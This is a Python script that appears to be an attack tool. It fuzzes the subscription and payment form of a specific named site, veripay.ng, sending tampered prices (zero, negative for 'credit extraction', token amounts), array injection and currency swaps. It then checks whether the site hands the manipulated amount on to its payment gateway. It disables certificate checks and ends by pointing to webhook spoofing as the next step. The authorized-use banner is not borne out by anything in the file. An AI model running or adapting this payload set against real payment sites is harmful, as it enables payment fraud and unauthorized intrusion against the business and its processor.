#!/usr/bin/env python3
import requests
import time
import urllib3

# Suppress insecure request warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner():
    print("="*60)
    print("  Veripay Business Logic & Parameter Fuzzer")
    print("  Target: Subscription Form & Payment Gateways")
    print("  NOTE: For authorized security research only.")
    print("="*60)

def test_parameter_tampering():
    # Hypothetical form submission endpoint based on /index.php/Form/home routing
    target_url = "https://veripay.ng/index.php/Form/submit" 
    print(f"\n[*] Testing Parameter Tampering on Subscription Form: {target_url}")
    
    # Original baseline data an honest user might submit
    baseline_data = {
        "company_name": "TestCorp Pentest",
        "plan_type": "enterprise",
        "billing_amount": "500000.00",
        "currency": "NGN",
        "step": "13"
    }

    # Malicious payloads attempting to bypass pricing logic
    tampering_payloads = [
        {"desc": "Zero out the billing amount", "payload": {"billing_amount": "0.00"}},
        {"desc": "Negative billing amount (Credit extraction attempt)", "payload": {"billing_amount": "-50000.00"}},
        {"desc": "Keep high tier plan but lower the price", "payload": {"plan_type": "enterprise", "billing_amount": "100.00"}},
        {"desc": "Array injection on pricing logic", "payload": {"billing_amount[]": "0"}},
        {"desc": "Currency manipulation (USD vs NGN)", "payload": {"currency": "USD", "billing_amount": "500.00"}}
    ]

    for test in tampering_payloads:
        print(f"[*] Fuzzing Vector: {test['desc']}")
        test_data = baseline_data.copy()
        test_data.update(test['payload'])
        
        try:
            # allow_redirects=False to inspect where the backend tries to send us (e.g. to Interswitch)
            res = requests.post(target_url, data=test_data, verify=False, timeout=8, allow_redirects=False)
            
            # If the server accepts the manipulated price, it might redirect to the payment gateway
            if res.status_code in [200, 301, 302]:
                location = res.headers.get("Location", "")
                if "interswitch" in res.text.lower() or "pay" in location.lower():
                    print(f"    [!] HIGH RISK: Server accepted payload and initiated payment flow.")
                    print(f"    [!] Target passed tampered amount: {test_data.get('billing_amount')}")
                elif res.status_code == 200 and "error" not in res.text.lower():
                    print(f"    [?] Server accepted payload without error. Manual verification required.")
                else:
                    print(f"    [-] Rejected or standard response. Status: {res.status_code}")
            else:
                print(f"    [-] Rejected. Status: {res.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"    [!] Connection/Routing Error: {e} (Endpoint might not exist or blocked)")
            
        time.sleep(1) # Gentle fuzzing

if __name__ == "__main__":
    print_banner()
    test_parameter_tampering()
    print("\n[!] Next Assessment Phase: Test Interswitch Webhook Callback spoofing locally.")
